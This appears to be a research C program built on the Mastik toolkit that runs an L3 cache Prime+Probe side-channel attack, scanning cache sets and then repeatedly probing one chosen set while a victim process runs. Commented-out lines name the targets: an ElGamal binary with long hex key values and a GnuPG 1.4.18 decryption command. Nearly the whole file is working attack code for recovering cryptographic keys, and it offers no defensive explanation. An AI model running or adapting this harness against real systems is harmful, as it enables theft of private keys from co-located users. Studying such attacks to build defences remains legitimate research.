/*
 * Copyright 2016 CSIRO
 *
 * This file is part of Mastik.
 *
 * Mastik is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Mastik is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Mastik.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#include <util.h>
#include <l3.h>
#include <unistd.h>

#define SAMPLES 35000
#define SAMPLES2 4000

#define LINESIZE 256               // 1行の長さの上限
#define BUFFERSIZE (LINESIZE + 1)

// static inline void lfence() {
//   asm volatile("lfence");
// }

// const unsigned char* s = (const unsigned char*)
// "taskset -c 1 ../target/elg 0xdc3f8e92602e2a4a177bd510cfdbe81ac5fe6acfa508848c5e1585be3b71aff627bc2dfd99"
// "f5086014f1e3cd1425cda028f25c266369f34bb48577137d9b56c4566a85b32dc963323242786bef562761d60711783a"
// "e91297be7a0ddce79a6943c95dcc4728fe712b722b9296c62378b2ccc1f0b270a9e4809b8940ec6e3d91fe3e6ef029e6"
// "ac22dbafab8c2106d36d279e8a623e1104a8fc10b3f200d0faa2d226a85d5a3928a05045e7576b4214cfcde9c613c142"
// "31c913be8338165999ddb4488c566fd703745037ad8bb4154735759e7def0fb9888ba47d8b9aa01f347dffefe46860fe"
// "fdc5e90cc2f0b4ade0d9f68d31b27b0f766a14e909adcfe96ef03008b920e43265ceacc2eef49e0247c0146c40aeabb5"
// "dcc0ed9662b38639bb49ce03398bf1e6095fd8bfbef00467ec5837c57c10d592c7e66150e8ce5d43b2585955b857533e"
// "676e156a43458a0a944b32928ea54c1429b0ad79b57112b00092cc0b3d893b90fc5a08979b69af7d96606a8b58a2f661"
// "e36aae1e7ba0fd0a01a0f3 "
// "0x065a805c9764eb3f4896aec16a0ff2ea714b78ceab541b6bfe917c5a0c3a7d68a4a797954541e74a9ea6b9687b80a3ce28e8b0 &";

// const unsigned char* s = (const unsigned char*)
// "/usr/local/gnupg-1.4.18/bin/gpg -o file_dec -r yukitam ../target/file";
// const unsigned char* s2 = (const unsigned char*)
// "rm file_dec";

int main(int ac, char **av) {
  delayloop(3000000000U);

  printf("%s\n", av[1]);
  l3pp_t l3 = l3_prepare(NULL);
  // printf("prepare end\n");

  int nsets = l3_getSets(l3);
  // printf("nsets : %d\n", nsets);

  uint16_t *res = calloc(SAMPLES, sizeof(uint16_t));
  for (int i = 0; i < SAMPLES; i+= 4096/sizeof(uint16_t))
    res[i] = 1;

  FILE *fp;
  fp = fopen(av[1], "a+");
  if(fp == NULL){
    printf("file error\n");
    exit(1);
  }
  int setnum = atoi(av[2]);
  printf("setnum : %d\n", setnum);

  for(int w = 0; w < 4; w++){
    for (int i = setnum; i < setnum + (1 << 11); i += (1 << 6)){
        l3_unmonitorall(l3);
        l3_monitor(l3, i + 2048 * w);
        // printf("###start monitor###\n");
        l3_repeatedprobe(l3, SAMPLES, res, 5000);
        // l3_repeatedprobe(l3, SAMPLES, res, 5000);
        // printf("###finish set %d###\n", i + 2048 * w);
        // l3_repeatedprobecount(l3, SAMPLES, res, 5000);
        l3_unmonitor(l3, i + 2048 * w);

        for (int j = 0; j < SAMPLES; j++) {
        		// printf("%d", (int16_t)res[j]);
        		fprintf(fp, "%d", (int16_t)res[j]);
            if (j < SAMPLES - 1)
              // printf(",");
              fprintf(fp, ",");
        }				// putchar('\n');
        // printf("\n");
        fprintf(fp, "\n");
    }
  }
  system("rm t.txt");
  sleep(2);
  fclose(fp);

  printf("input set number\n");
  FILE *inputfile;
  char linebuffer[BUFFERSIZE];

  while(1){
    inputfile = fopen("set.txt", "r");    // ファイルを読み出し用にオープン(開く)
    if (inputfile != NULL) {            // オープンに失敗した場合
      printf("get\n");
      break;
    }
    sleep(2);
  }

  fp = fopen(av[1], "a+");
  if(fp == NULL){
    printf("file error\n");
    exit(1);
  }
  char *s;
  s = fgets(linebuffer, BUFFERSIZE, inputfile);
  if (s == NULL) {
    printf("s Null\n");
  }
  int set = atoi(s);
  printf("%s\n", s);
  printf("%d\n", set);
  sleep(2);
  // printf("%d\n", set + 1);

  system("touch t.txt");
  system("taskset -c 1 ../target/loop.sh &");
  sleep(2);

  for (int i = 0; i < SAMPLES2; i ++){
    l3_unmonitorall(l3);
    l3_monitor(l3, set);
    // printf("###start monitor###\n");
    l3_repeatedprobe(l3, SAMPLES, res, 5000);
    // printf("###finish set %d###\n", i + 2048 * w);
    // l3_repeatedprobecount(l3, SAMPLES, res, 5000);
    l3_unmonitor(l3, set);

    for (int j = 0; j < SAMPLES; j++) {
      // printf("%d", (int16_t)res[j]);
      fprintf(fp, "%d", (int16_t)res[j]);
      if (j < SAMPLES - 1)
      // printf(",");
      fprintf(fp, ",");
    }				// putchar('\n');
    fprintf(fp, "\n");
    // printf("\n");
  }


  fclose(fp);
  fclose(inputfile);
  free(res);
  l3_release(l3);
}
